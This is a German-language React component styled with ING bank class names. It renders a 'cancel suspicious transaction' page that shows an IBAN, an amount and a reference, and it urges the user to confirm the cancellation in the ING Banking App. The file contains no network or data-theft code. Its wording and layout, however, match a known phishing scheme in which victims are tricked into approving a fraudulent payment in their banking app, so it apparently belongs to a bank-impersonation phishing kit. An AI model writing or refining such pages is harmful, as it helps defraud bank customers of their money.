import React from 'react';

interface CancellationFormProps {
  iban: string;
  amount: string;
  reference: string;
  onStartCancellation: () => void;
}

const CancellationForm: React.FC<CancellationFormProps> = ({ 
  iban, 
  amount, 
  reference,
  onStartCancellation
}) => {
  return (
    <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      minHeight: '60vh',
      padding: '40px 20px'
    }}>
      <div className="ing-card" style={{ 
        padding: '40px',
        maxWidth: '600px',
        width: '100%'
      }}>
        <h2 className="heading--m" style={{ textAlign: 'center', marginBottom: '30px' }}>
          Transaktion stornieren
        </h2>
        
        <div className="alert alert--warning" style={{ marginBottom: '30px' }}>
          <div style={{ display: 'flex', alignItems: 'flex-start', gap: '12px' }}>
            <div style={{
              width: '24px',
              height: '24px',
              flexShrink: 0,
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center'
            }}>
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>
              </svg>
            </div>
            <div>
              <div style={{ fontWeight: 'bold', marginBottom: '8px' }}>
                Bitte bestätigen Sie die Stornierung
              </div>
              <p style={{ margin: 0 }}>
                Um diese verdächtige Transaktion zu stornieren, überprüfen Sie bitte die Details
                und bestätigen Sie die Stornierung in Ihrer ING Banking App.
              </p>
            </div>
          </div>
        </div>
        
        <div className="transaction-details">
          <div className="transaction-item">
            <span className="transaction-label">Empfänger IBAN:</span>
            <span className="transaction-value">{iban}</span>
          </div>
          <div className="transaction-item">
            <span className="transaction-label">Betrag:</span>
            <span className="transaction-value">{amount} €</span>
          </div>
          <div className="transaction-item">
            <span className="transaction-label">Verwendungszweck:</span>
            <span className="transaction-value">{reference}</span>
          </div>
        </div>
        
        <div style={{ textAlign: 'center', marginTop: '30px' }}>
          <button 
            className="button button--primary"
            onClick={onStartCancellation}
            style={{ width: '100%', maxWidth: '300px' }}
          >
            Jetzt stornieren
          </button>
        </div>
      </div>
    </div>
  );
};

export default CancellationForm;
